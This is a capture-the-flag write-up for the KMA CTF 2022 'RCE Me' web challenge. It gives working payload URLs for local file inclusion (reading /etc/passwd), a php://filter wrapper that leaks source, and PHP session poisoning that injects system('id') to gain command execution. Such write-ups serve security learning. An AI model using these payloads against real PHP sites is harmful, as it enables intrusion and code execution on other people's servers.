# KMA CTF 2022 - RCE Me

**hint**: I am using php-fpm alpine docker

**Vulnerable to LFI**: `http://rce-me.ctf.actvn.edu.vn/?l=/etc/passwd`
```
root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin utmp:x:100:406:utmp:/home/utmp:/bin/false
```

Let's try to read source code using `php wrapper`: `http://rce-me.ctf.actvn.edu.vn/?l=php://filter/convert.base64-encode/resource=index.php`
```php
<?php
session_start();
$_SESSION['name'] = @$_GET["name"];
$l = @$_GET['l'];
if ($l) include $l;
?>
<h1>Try rce me!</h1>
<h2>
  <a href="?l=/etc/passwd">?l=/etc/passwd</a>
</h2>
```

The idea very is very clear, if we can read php session file, we can using `name parameter` to inject PHP code to session file to get RCE:

**PHP session file location**: Just google it, stack overflow,.. try everything... haizz!!
*References*:
First check the value of `session.save_path` using `ini_get('session.save_path')` or `phpinfo()`. If that is non-empty, then it will show where the session files are saved. In many scenarios `it is empty by default`, in which case read on:

On `Ubuntu or Debian` machines, if `session.save_path is not set`, then session files are saved in `/var/lib/php5`.

On `RHEL and CentOS` systems, if `session.save_path is not set`, session files will be saved in `/var/lib/php/session`

I think that if you `compile PHP from source`, then when `session.save_path is not set`, session files will be saved in `/tmp`.

And yes, your php session file location is: 
```
/tmp/sess_[YOUR-PHP-SESSION-ID]
```

**Try**: `http://rce-me.ctf.actvn.edu.vn/?l=/tmp/sess_sd8vma27g1tuo0e6e1v7e18jj1`
```html
name|N;
```

`http://rce-me.ctf.actvn.edu.vn/?l=/tmp/sess_sd8vma27g1tuo0e6e1v7e18jj1&name=<?php system('id'); ?>`
```html
name|s:22:"uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data) ";
```

Do some simple rce, we found file contain the flag: `flag_KMACTF_hihi_do_anh_bat_duoc_em.txt`

**flag**: `KMACTF{Do_anh_session_duoc_em_hihi}` 